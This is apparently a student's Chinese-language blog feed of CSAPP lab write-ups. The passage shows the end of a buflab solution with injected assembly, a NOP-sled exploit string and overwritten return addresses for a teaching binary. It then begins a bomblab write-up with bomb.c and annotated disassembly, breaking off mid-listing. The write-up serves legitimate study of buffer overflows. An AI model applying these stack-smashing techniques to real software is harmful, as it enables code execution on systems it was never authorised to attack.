alt="image-20210602084151289"></p><ul><li><p>故更改后的<code>getbuf</code>的部分栈帧如下：</p><p><img src="/2021/05/01/buflab/image-20210601201240748.png" alt="image-20210601201240748"></p></li><li><p>故注入的字符串为代码的字符编码（共11个字节）+29个字节（除了0x0a以外的任意字符）+<code>10 36 68 55</code>（原ebp的值，小端法表示）+<code>b8 35 68 55</code>（buf的起始地址的小端法表示）。txt文件如下：</p><p><img src="/2021/05/01/buflab/image-20210601201456344.png" alt="image-20210601201456344"></p></li></ul><h4 id="结果：-3"><a href="#结果：-3" class="headerlink" title="结果："></a>结果：</h4><p><img src="/2021/05/01/buflab/image-20210601201603573.png" alt="image-20210601201603573"></p><h3 id="Level-4-Nitroglycerin-10-pts"><a href="#Level-4-Nitroglycerin-10-pts" class="headerlink" title="Level 4: Nitroglycerin (10 pts)"></a>Level 4: Nitroglycerin (10 pts)</h3><p><code>testn</code>的汇编代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">Dump of assembler code for function testn:<br>   0x08048cce &lt;+0&gt;:push   %ebp<br>   0x08048ccf &lt;+1&gt;:mov    %esp,%ebp<br>   0x08048cd1 &lt;+3&gt;:push   %ebx<br>   0x08048cd2 &lt;+4&gt;:sub    $0x24,%esp<br>   0x08048cd5 &lt;+7&gt;:call   0x8048c18 &lt;uniqueval&gt;<br>   0x08048cda &lt;+12&gt;:mov    %eax,-0xc(%ebp)<br>   0x08048cdd &lt;+15&gt;:call   0x8049244 &lt;getbufn&gt;<br>   0x08048ce2 &lt;+20&gt;:mov    %eax,%ebx<br>   0x08048ce4 &lt;+22&gt;:call   0x8048c18 &lt;uniqueval&gt;<br>   0x08048ce9 &lt;+27&gt;:mov    -0xc(%ebp),%edx<br>   0x08048cec &lt;+30&gt;:cmp    %edx,%eax<br>   0x08048cee &lt;+32&gt;:je     0x8048d06 &lt;testn+56&gt;<br>   0x08048cf0 &lt;+34&gt;:movl   $0x804a460,0x4(%esp)<br>   0x08048cf8 &lt;+42&gt;:movl   $0x1,(%esp)<br>   0x08048cff &lt;+49&gt;:call   0x8048990 &lt;__printf_chk@plt&gt;<br>   0x08048d04 &lt;+54&gt;:jmp    0x8048d4c &lt;testn+126&gt;<br>   0x08048d06 &lt;+56&gt;:cmp    0x804d104,%ebx<br>   0x08048d0c &lt;+62&gt;:jne    0x8048d34 &lt;testn+102&gt;<br>   0x08048d0e &lt;+64&gt;:mov    %ebx,0x8(%esp)<br>   0x08048d12 &lt;+68&gt;:movl   $0x804a48c,0x4(%esp)<br>   0x08048d1a &lt;+76&gt;:movl   $0x1,(%esp)<br>   0x08048d21 &lt;+83&gt;:call   0x8048990 &lt;__printf_chk@plt&gt;<br>   0x08048d26 &lt;+88&gt;:movl   $0x4,(%esp)<br>   0x08048d2d &lt;+95&gt;:call   0x8049280 &lt;validate&gt;<br>   0x08048d32 &lt;+100&gt;:jmp    0x8048d4c &lt;testn+126&gt;<br>   0x08048d34 &lt;+102&gt;:mov    %ebx,0x8(%esp)<br>   0x08048d38 &lt;+106&gt;:movl   $0x804a2a6,0x4(%esp)<br>   0x08048d40 &lt;+114&gt;:movl   $0x1,(%esp)<br>   0x08048d47 &lt;+121&gt;:call   0x8048990 &lt;__printf_chk@plt&gt;<br>   0x08048d4c &lt;+126&gt;:add    $0x24,%esp<br>   0x08048d4f &lt;+129&gt;:pop    %ebx<br>   0x08048d50 &lt;+130&gt;:pop    %ebp<br>   0x08048d51 &lt;+131&gt;:ret    <br>End of assembler dump.<br></code></pre></div></td></tr></table></figure><h4 id="目标：-4"><a href="#目标：-4" class="headerlink" title="目标："></a>目标：</h4><p>​        在Nitro模式下运行时，BUFBOMB要求提供字符串5次，它将执行<code>getbufn</code> 5次，每次都有不同的堆栈偏移量。</p><p>​        与Level3相同，Level4要求提供一个漏洞字符串，该字符串将导致<code>getbufn</code>将<code>cookie</code>返回到<code>testn</code>，而不是值1。可以在<code>testn</code>的代码中看到，这将导致程序进入“KABOOM！”。攻击代码需要将<code>cookie</code>设置为返回值，同时应恢复任何损坏的状态，在堆栈上设定正确的返回地址，并执行<code>ret</code>指令以真正返回<code>testn</code>。</p><h4 id="分析：-3"><a href="#分析：-3" class="headerlink" title="分析："></a>分析：</h4><p><code>getbufn</code>的汇编代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">Dump of assembler code for function getbufn:<br>   0x08049244 &lt;+0&gt;:push   %ebp<br>   0x08049245 &lt;+1&gt;:mov    %esp,%ebp<br>   0x08049247 &lt;+3&gt;:sub    $0x218,%esp<br>   0x0804924d &lt;+9&gt;:lea    -0x208(%ebp),%eax<br>   0x08049253 &lt;+15&gt;:mov    %eax,(%esp)<br>   0x08049256 &lt;+18&gt;:call   0x8048c32 &lt;Gets&gt;<br>   0x0804925b &lt;+23&gt;:mov    $0x1,%eax<br>   0x08049260 &lt;+28&gt;:leave  <br>   0x08049261 &lt;+29&gt;:ret    <br>End of assembler dump.<br></code></pre></div></td></tr></table></figure><ul><li><p><code>ebp-0x208</code>的地址为<code>Gets()</code>函数的参数。<code>Gets()</code>将以该地址为起点向地址增大的方向保存字符。</p></li><li><p>通过调试，观察每次执行<code>testn</code>时的<code>ebp</code>，以及对应的<code>getbufn</code>的<code>ebp</code>的变化。</p><p><img src="/2021/05/01/buflab/image-20210602084724410.png" alt="image-20210602084724410"><img src="/2021/05/01/buflab/image-20210602084741390.png" alt="image-20210602084741390"><img src="/2021/05/01/buflab/image-20210602084801354.png" alt="image-20210602084801354"><img src="/2021/05/01/buflab/image-20210602084816623.png" alt="image-20210602084816623"></p><p><img src="/2021/05/01/buflab/image-20210602084857133.png" alt="image-20210602084857133"></p></li><li><p>观察到<code>testn</code>的<code>ebp</code>是变化的，最大值为<code>0x55683680</code>，最小值为<code>0x556835a0</code>，差值为0xE0（224）。<code>getbufn</code>的<code>ebp</code>同样是变化的，最大值为<code>0x55683650</code>，最小值为<code>0x55683570</code>。对应的<code>buf</code>起始地址最大值为<code>0x55683448</code>，最小值为<code>0x55683368</code>。由于我们注入的返回地址是固定的，故我们注入的返回地址须不小于<code>0x55683468</code>，否则可能出现<code>buf</code>覆盖的地址都大于设定的返回地址，从返回地址向高地址执行命令时执行了未知命令的情况。</p></li><li><p>类似于Level3，我们从更改后的返回地址开始执行指令。由于设定的返回地址不小于<code>0x55683448</code>，当<code>buf</code>的起始地址小于设定的返回地址时，就需要想办法使注入的攻击代码出现在返回地址的高处。我们就设定返回地址为<code>0x55683448</code>，则<code>buf</code>起始地址的最小值相差了224个字节，这就需要至少填充224个字节的nop指令（nop指令只使程序计数器加1），从而在任何情况下都能使CPU将指令至少执行到注入的攻击代码（若填充00，则CPU无法识别，无法进行后续操作）。</p></li><li><p>而<code>testn</code>的<code>ebp</code>是不断的变化的，无法像Level3一样在内存中注入固定的值恢复保存的<code>ebp</code>。但我们可以找到<code>getbufn</code>的<code>ebp</code>与<code>testn</code>的<code>ebp</code>的关系，即前者比后者小了<code>0x30</code>。我们的攻击代码是在<code>getbufn</code>的<code>leave</code>、<code>ret</code>指令之后执行的。在这两次指令后，<code>esp</code>的值变为<code>getbufn</code>的<code>ebp</code>+<code>0x8</code>，而本身的<code>ebp</code>变为保存的<code>ebp</code>的值（但被buf溢出覆盖）。故此时，我们可以根据这个关系：<code>testn</code>的<code>ebp</code>=<code>esp</code>+<code>0x28</code>编写注入的代码。</p></li><li><p>注入的代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">mov$0x20083f2f,%eax/*将cookie的值保存在eax中*/<br>lea0x28(%esp),%ebp/*恢复保存的ebp的值*/<br>push$0x08048ce2/*testn的call &lt;getbuf&gt;之后的地址入栈*/<br>ret/*返回*/<br></code></pre></div></td></tr></table></figure></li><li><p>输入指令，反汇编得机器码如下，共15个字节：</p></li></ul><p><img src="/2021/05/01/buflab/image-20210602090320808.png" alt="image-20210602090320808"></p><ul><li><p>可以得到栈帧的示意图：</p><p><img src="/2021/05/01/buflab/image-20210602091128347.png" alt="image-20210602091128347"></p></li><li><p><code>getbufn</code>的ebp-0x208为buf的起始地址，0x208为520。故注入的字符串为509个nop（0x90）+15个字节的攻击代码+<code>48 34 68 55</code>(修改的返回地址，小端法表示)。txt文件如下：</p></li></ul><p><img src="/2021/05/01/buflab/image-20210602091213381.png" alt="image-20210602091213381"></p><h4 id="结果：-4"><a href="#结果：-4" class="headerlink" title="结果："></a>结果：</h4><p><img src="/2021/05/01/buflab/image-20210602091240597.png" alt="image-20210602091240597"></p><h3 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h3><ol><li><p>这次实验的难度随级别的提高而增加，引导我们如何利用缓冲区存在的漏洞实现一些目的：</p><p>Level0：利用直接覆盖返回地址，在调用函数getbuf时直接返回smoke函数，让我们初步认识缓冲区溢出攻击的原理。</p><p>Level1：在Level0的基础上，多了修改函数参数的操作，这需要我们结合汇编代码找到参数的位置。</p><p>Level2：开始需要我们自己编写汇编代码段去实现操作：修改返回值、设置全局变量、跳转。同时也需要利用缓冲区溢出，跳转至这段代码的起始地址。</p><p>Level3：同时利用自己编写的代码设置返回值并返回至test函数，需要覆盖buf时要保持函数保存的旧ebp不变。</p><p>Level4：每次调用getbufn的目的与Level3一致，不同的是它的ebp不断变化，需要找到等式关系去编写代码以修正而ebp。难点还在于多次调用使栈基址随机化，这需要利用弄nop_sled的技术。</p><p>通过学习、理解如何实现缓冲区溢出攻击，我对函数调用、栈帧空间的分配、nop_sled的使用等相关知识有了更加深刻的理解。</p></li><li><p>在实验的部分地方需要对运行过程进行调试，查看某个寄存器的值及其变化。所以gdb工具的使用是不可或缺的。通过完成这次实验，我对gdb工具的使用更加熟练。</p></li><li><p>进行实验，细心和耐心也是很重要的品质。有时候会因为不够细心而耽误时间，如Level4中我因为看错了ebp的值，使得第一次尝试没有通过，但好在能够通过调试发现错误之处，并加以改正。有了细心和耐心的加持，才能更好地完成一个个实验，收获知识，提升技能。</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>《深入理解计算机系统》</category>
      
    </categories>
    
    
    <tags>
      
      <tag>深入理解计算机系统</tag>
      
      <tag>CSAPP-LAB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP-bomblab</title>
    <link href="/2021/04/01/bomblab/"/>
    <url>/2021/04/01/bomblab/</url>
    
    <content type="html"><![CDATA[<h1 id="CSAPP-bomblab"><a href="#CSAPP-bomblab" class="headerlink" title="CSAPP-bomblab"></a>CSAPP-bomblab</h1><h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><p>​    理解汇编语言，学习使用gdb调试器，推导出正确的字符串用于跳过explode_bomb，破解bomb.c生成的炸弹。</p><h2 id="实验环境和工具"><a href="#实验环境和工具" class="headerlink" title="实验环境和工具"></a>实验环境和工具</h2><p>​    ubuntu 12.04.5 (32位) ；</p><p>​    gdb 7.4 ；</p><h2 id="实验内容及操作步骤"><a href="#实验内容及操作步骤" class="headerlink" title="实验内容及操作步骤"></a>实验内容及操作步骤</h2><h3 id="阅读bomb-c"><a href="#阅读bomb-c" class="headerlink" title="阅读bomb.c"></a>阅读bomb.c</h3><ul><li>C文件开头的注释如下：</li></ul><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">/***************************************************************************</span><br><span class="hljs-comment"> * Dr. Evil&#x27;s Insidious Bomb, Version 1.1</span><br><span class="hljs-comment"> * Copyright 2011, Dr. Evil Incorporated. All rights reserved.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * LICENSE:</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Dr. Evil Incorporated (the PERPETRATOR) hereby grants you (the</span><br><span class="hljs-comment"> * VICTIM) explicit permission to use this bomb (the BOMB).  This is a</span><br><span class="hljs-comment"> * time limited license, which expires on the death of the VICTIM.</span><br><span class="hljs-comment"> * The PERPETRATOR takes no responsibility for damage, frustration,</span><br><span class="hljs-comment"> * insanity, bug-eyes, carpal-tunnel syndrome, loss of sleep, or other</span><br><span class="hljs-comment"> * harm to the VICTIM.  Unless the PERPETRATOR wants to take credit,</span><br><span class="hljs-comment"> * that is.  The VICTIM may not distribute this bomb source code to</span><br><span class="hljs-comment"> * any enemies of the PERPETRATOR.  No VICTIM may debug,</span><br><span class="hljs-comment"> * reverse-engineer, run &quot;strings&quot; on, decompile, decrypt, or use any</span><br><span class="hljs-comment"> * other technique to gain knowledge of and defuse the BOMB.  BOMB</span><br><span class="hljs-comment"> * proof clothing may not be worn when handling this program.  The</span><br><span class="hljs-comment"> * PERPETRATOR will not apologize for the PERPETRATOR&#x27;s poor sense of</span><br><span class="hljs-comment"> * humor.  This license is null and void where the BOMB is prohibited</span><br><span class="hljs-comment"> * by law.</span><br><span class="hljs-comment"> ***************************************************************************/</span><br></code></pre></div></td></tr></table></figure><ul><li>翻译如下：</li></ul><p>​    Evil Incorporated博士（PERPETRATOR）特此授予您（VICTIM）使用该炸弹（BOMB）的明确许可。 这是一个有时间限制的许可证，在VICTIM死亡时到期。 PERPETRATOR对损坏，沮丧，精神错乱，虫眼，腕管综合症，睡眠不足或对VICTIM造成的其他伤害不承担任何责任。 除非PERPETRATOR想要获得信誉，否则就是这样。 VICTIM不得将此炸弹源代码分发给PERPETRATOR的任何敌人。 VICTIM不得调试，反向工程，在其上运行“字符串”，反编译，解密或使用任何其他技术来了解和缓解BOMB。 处理此程序时，可能不能穿防弹衣。 PERPETRATOR不会因PERPETRATOR的幽默感而道歉。 在法律禁止BOMB的情况下，此许可无效。</p><ul><li>bomb.c代码如下：（英文注释做了适当翻译）</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;support.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;phases.h&quot;</span></span><br><br><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * Note to self: Remember to erase this file so my victims will have no</span><br><span class="hljs-comment"> * idea what is going on, and so they will all blow up in a</span><br><span class="hljs-comment"> * spectaculary fiendish explosion. -- Dr. Evil </span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">//自我提醒：请记住要删除此文件，以使我的受害者不知道发生了什么事，因此他们都会在一场壮观的恶魔般的爆炸中炸毁。 -邪恶博士</span><br><br>FILE *infile;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span><br>&#123;<br>    <span class="hljs-type">char</span> *input;<br><br>    <span class="hljs-comment">/* Note to self: remember to port this bomb to Windows and put a </span><br><span class="hljs-comment">     * fantastic GUI on it. */</span><span class="hljs-comment">//自我提醒：记得将炸弹移植到Windows并在上面放上精美的GUI。</span><br>    <br>    <span class="hljs-comment">/* When run with no arguments, the bomb reads its input lines </span><br><span class="hljs-comment">     * from standard input. */</span><span class="hljs-comment">//当不带参数运行时，炸弹会从标准输入中读取其输入行。</span><br>    <span class="hljs-keyword">if</span> (argc == <span class="hljs-number">1</span>) &#123;  <br>infile = <span class="hljs-built_in">stdin</span>;<br>    &#125; <br><br>    <span class="hljs-comment">/* When run with one argument &lt;file&gt;, the bomb reads from &lt;file&gt; </span><br><span class="hljs-comment">     * until EOF, and then switches to standard input. Thus, as you </span><br><span class="hljs-comment">     * defuse each phase, you can add its defusing string to &lt;file&gt; and</span><br><span class="hljs-comment">     * avoid having to retype it. */</span><br>    <span class="hljs-comment">//当使用一个参数&lt;file&gt;运行时，炸弹会从&lt;file&gt;读取直到EOF，然后切换到标准输入。 因此，在对每个阶段进行解压缩时，可以将其解压缩字符串添加到&lt;file&gt;中，而不必重新输入。</span><br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (argc == <span class="hljs-number">2</span>) &#123;<br><span class="hljs-keyword">if</span> (!(infile = fopen(argv[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;r&quot;</span>))) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s: Error: Couldn&#x27;t open %s\n&quot;</span>, argv[<span class="hljs-number">0</span>], argv[<span class="hljs-number">1</span>]);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">8</span>);<br>&#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* You can&#x27;t call the bomb with more than 1 command line argument. */</span>    <span class="hljs-comment">//您不能使用超过1个命令行参数来调用炸弹。</span><br>    <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Usage: %s [&lt;input_file&gt;]\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">8</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* Do all sorts of secret stuff that makes the bomb harder to defuse. */</span>  <span class="hljs-comment">//做各种使炸弹难以化解的秘密工作。</span><br>    initialize_bomb();<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Welcome to my fiendish little bomb. You have 6 phases with\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;which to blow yourself up. Have a nice day!\n&quot;</span>);<br><br>    <span class="hljs-comment">/* Hmm...  Six phases must be more secure than one phase! */</span><br>    <span class="hljs-comment">//嗯...六个阶段必须比一个阶段更安全！</span><br>    input = read_line();             <span class="hljs-comment">/* Get input                   */</span> <span class="hljs-comment">//获取输入</span><br>    phase_1(input);                  <span class="hljs-comment">/* Run the phase               */</span> <span class="hljs-comment">//运行阶段</span><br>    phase_defused();                 <span class="hljs-comment">/* Drat!  They figured it out!//他们想通了！</span><br><span class="hljs-comment">      * Let me know how they did it. */</span><span class="hljs-comment">//让我知道他们是如何做到的。</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Phase 1 defused. How about the next one?\n&quot;</span>);<br><br>    <span class="hljs-comment">/* The second phase is harder.  No one will ever figure out</span><br><span class="hljs-comment">     * how to defuse this... */</span><span class="hljs-comment">//第二阶段比较困难。 没有人会想出如何化解这个问题的。</span><br>    input = read_line();<br>    phase_2(input);<br>    phase_defused();<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;That&#x27;s number 2.  Keep going!\n&quot;</span>);<br><br>    <span class="hljs-comment">/* I guess this is too easy so far.  Some more complex code will</span><br><span class="hljs-comment">     * confuse people. */</span><span class="hljs-comment">//我想到目前为止这太容易了。 一些更复杂的代码会使人们感到困惑。</span><br>    input = read_line();<br>    phase_3(input);<br>    phase_defused();<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Halfway there!\n&quot;</span>);<br><br>    <span class="hljs-comment">/* Oh yeah?  Well, how good is your math?  Try on this saucy problem! */</span> <span class="hljs-comment">//哦耶？ 好吧，你的数学有多好？ 尝试这个棘手的问题！</span><br>    input = read_line();<br>    phase_4(input);<br>    phase_defused();<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;So you got that one.  Try this one.\n&quot;</span>);<br>    <br>    <span class="hljs-comment">/* Round and &#x27;round in memory we go, where we stop, the bomb blows! */</span><span class="hljs-comment">//我们在记忆中走来走去，停下来，炸弹炸毁！</span><br>    input = read_line();<br>    phase_5(input);<br>    phase_defused();<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Good work!  On to the next...\n&quot;</span>);<br><br>    <span class="hljs-comment">/* This phase will never be used, since no one will get past the</span><br><span class="hljs-comment">     * earlier ones.  But just in case, make this one extra hard. */</span><br>    <span class="hljs-comment">//此阶段将永远不会使用，因为没有人会越过早期的阶段。 但以防万一，使这一操作更加困难。</span><br>    input = read_line();<br>    phase_6(input);<br>    phase_defused();<br><br>    <span class="hljs-comment">/* Wow, they got it!  But isn&#x27;t something... missing?  Perhaps</span><br><span class="hljs-comment">     * something they overlooked?  Mua ha ha ha ha! */</span><span class="hljs-comment">//哇，他们明白了！ 但是，是不是……缺少了什么？ 也许他们忽略了什么？ 哇哈哈哈哈哈！</span><br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li>总之，有两种方法闯关：</li></ul><ol><li><code>./bomb</code>，然后在终端输入</li><li><code>./bomb xxx.txt</code>，<code>xxx.txt</code>中按行保存用于过关的字符串</li></ol><h3 id="分析汇编代码，找到通关密码"><a href="#分析汇编代码，找到通关密码" class="headerlink" title="分析汇编代码，找到通关密码"></a>分析汇编代码，找到通关密码</h3><h4 id="1-phase-1"><a href="#1-phase-1" class="headerlink" title="1.  phase_1"></a>1.  phase_1</h4><ul><li><p>phase_1的汇编代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">Dump of assembler code for function phase_1:<br>   0x08048b50 &lt;+0&gt;:sub    $0x1c,%esp<br>   ;栈指针esp减去0x1c，给当前帧开辟大小为0x1c的空间<br>   0x08048b53 &lt;+3&gt;:movl   $0x804a1a4,0x4(%esp)<br>   ;将0x804a1a4（原字符串在内存中的地址）赋给M[0x4+esp]。<br>   ;（从后面调用函数&lt;strings_not_equal&gt;推测其为字符串，通过查看&lt;strings_not_equal&gt;的汇编代码进行验证）<br>   0x08048b5b &lt;+11&gt;:mov    0x20(%esp),%eax;将M[0x20+%esp]（输入的字符串）赋值给eax<br>   0x08048b5f &lt;+15&gt;:mov    %eax,(%esp)<br>   ;eax的值赋给M[esp]，与M[0x4+esp]共同作为&lt;strings_not_equal&gt;的参数<br>   0x08048b62 &lt;+18&gt;:call   0x8048fd4 &lt;strings_not_equal&gt;<br>   ;比较两字符串是否相等，若相等，则返回值%eax=0<br>   0x08048b67 &lt;+23&gt;:test   %eax,%eax;如果eax=0，则zf=1<br>   0x08048b69 &lt;+25&gt;:je     0x8048b70 &lt;phase_1+32&gt;;zf=1时跳转至*（phase_1+32）,即下一关<br>   0x08048b6b &lt;+27&gt;:call   0x80490e6 &lt;explode_bomb&gt;;否则爆炸<br>   0x08048b70 &lt;+32&gt;:add    $0x1c,%esp<br>   0x08048b73 &lt;+35&gt;:ret<br>End of assembler dump.<br></code></pre></div></td></tr></table></figure><ul><li><p>其中，<code>&lt;strings_not_equal&gt;</code>的汇编代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">·#执行call指令:esp=esp-4<br>Dump of assembler code for function strings_not_equal:<br>   0x08048fd4 &lt;+0&gt;:sub    $0x10,%esp;esp=esp-10<br>   0x08048fd7 &lt;+3&gt;:mov    %ebx,0x4(%esp)<br>   0x08048fdb &lt;+7&gt;:mov    %esi,0x8(%esp)<br>   0x08048fdf &lt;+11&gt;:mov    %edi,0xc(%esp)<br>   0x08048fe3 &lt;+15&gt;:mov    0x14(%esp),%ebx<br>   ;此时M[0x14+esp]为输入的字符串*s1,存入ebx<br>   0x08048fe7 &lt;+19&gt;:mov    0x18(%esp),%esi<br>   ;此时M[0x18+esp]为原字符串*s0，存入esi<br>   0x08048feb &lt;+23&gt;:mov    %ebx,(%esp)<br>   0x08048fee &lt;+26&gt;:call   0x8048fbb &lt;string_length&gt;<br>   ;eax返回值为ebx中字符串的长度s1.length<br>   0x08048ff3 &lt;+31&gt;:mov    %eax,%edi;存入edi<br>   0x08048ff5 &lt;+33&gt;:mov    %esi,(%esp)<br>   0x08048ff8 &lt;+36&gt;:call   0x8048fbb &lt;string_length&gt;<br>   ;eax返回值为esi中字符串的长度s0.length<br>   0x08048ffd &lt;+41&gt;:mov    $0x1,%edx<br>   0x08049002 &lt;+46&gt;:cmp    %eax,%edi;比较s1.length和s0.length<br>   0x08049004 &lt;+48&gt;:jne    0x8049039 